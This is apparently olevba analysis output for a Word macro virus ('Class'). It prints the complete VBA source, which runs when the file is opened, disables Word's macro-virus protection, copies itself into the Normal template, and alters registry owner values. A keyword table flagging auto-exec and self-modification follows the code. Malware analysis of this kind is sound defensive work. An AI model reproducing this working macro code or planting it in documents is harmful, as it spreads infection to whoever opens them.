olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-5d740db4ee464cb10c22747f43a3459d8b839da5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-5d740db4ee464cb10c22747f43a3459d8b839da5 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'user20.10.05 17:11:20наша деятельность.doc
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'user20.10.05 17:11:20наша деятельность.doc
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'user20.10.05 17:11:20наша деятельность.doc
Const REG_SZ As Long = 1
'user20.10.05 17:11:20наша деятельность.doc
Const HKEY_CURRENT_USER As Long = &H80000001
'user20.10.05 17:11:20наша деятельность.doc
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'user20.10.05 17:11:20наша деятельность.doc
Sub AutoOpen()
'user20.10.05 17:11:20наша деятельность.doc
On Error GoTo out
'user20.10.05 17:11:20наша деятельность.doc
Options.VirusProtection = False
'user20.10.05 17:11:20наша деятельность.doc
Options.SaveNormalPrompt = False
'user20.10.05 17:11:20наша деятельность.doc
Options.ConfirmConversions = False
'user20.10.05 17:11:20наша деятельность.doc
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'user20.10.05 17:11:20наша деятельность.doc
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'user20.10.05 17:11:20наша деятельность.doc
If nt > 70 And ad > 0 Then GoTo out
'user20.10.05 17:11:20наша деятельность.doc
If nt < 70 Then
'user20.10.05 17:11:20наша деятельность.doc
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'user20.10.05 17:11:20наша деятельность.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'user20.10.05 17:11:20наша деятельность.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'user20.10.05 17:11:20наша деятельность.doc
End If
'user20.10.05 17:11:20наша деятельность.doc
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'user20.10.05 17:11:20наша деятельность.doc
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'user20.10.05 17:11:20наша деятельность.doc
host.codemodule.AddFromFile ("c:\class.sys")
'user20.10.05 17:11:20наша деятельность.doc
With host.codemodule
'user20.10.05 17:11:20наша деятельность.doc
    For x = 1 To 16
'user20.10.05 17:11:20наша деятельность.doc
    .deletelines 1
'user20.10.05 17:11:20наша деятельность.doc
    Next x
'user20.10.05 17:11:20наша деятельность.doc
End With
'user20.10.05 17:11:20наша деятельность.doc
If nt < 70 Then
'user20.10.05 17:11:20наша деятельность.doc
    With host.codemodule
'user20.10.05 17:11:20наша деятельность.doc
    .replaceline 1, "Sub AutoClose()"
'user20.10.05 17:11:20наша деятельность.doc
    .replaceline 91, "Sub ToolsMacro()"
'user20.10.05 17:11:20наша деятельность.doc
    For x = 70 To 81
'user20.10.05 17:11:20наша деятельность.doc
        .deletelines 62
'user20.10.05 17:11:20наша деятельность.doc
    Next x
'user20.10.05 17:11:20наша деятельность.doc
    .replaceline 35, "    For x = 1 To 4"
'user20.10.05 17:11:20наша деятельность.doc
    End With
'user20.10.05 17:11:20наша деятельность.doc
End If
'user20.10.05 17:11:20наша деятельность.doc
If nt < 70 Then
'user20.10.05 17:11:20наша деятельность.doc
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'user20.10.05 17:11:20наша деятельность.doc
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'user20.10.05 17:11:20наша деятельность.doc
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'user20.10.05 17:11:20наша деятельность.doc
u = RegCloseKey(k)
'user20.10.05 17:11:20наша деятельность.doc
End If
'user20.10.05 17:11:20наша деятельность.doc
With host.codemodule
'user20.10.05 17:11:20наша деятельность.doc
    For x = 2 To 104 Step 2
'user20.10.05 17:11:20наша деятельность.doc
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'user20.10.05 17:11:20наша деятельность.doc
    Next x
'user20.10.05 17:11:20наша деятельность.doc
End With
'user20.10.05 17:11:20наша деятельность.doc
out:
'user20.10.05 17:11:20наша деятельность.doc
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'user20.10.05 17:11:20наша деятельность.doc
End Sub
'user20.10.05 17:11:20наша деятельность.doc
Sub ViewVBCode()
'user20.10.05 17:11:20наша деятельность.doc
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

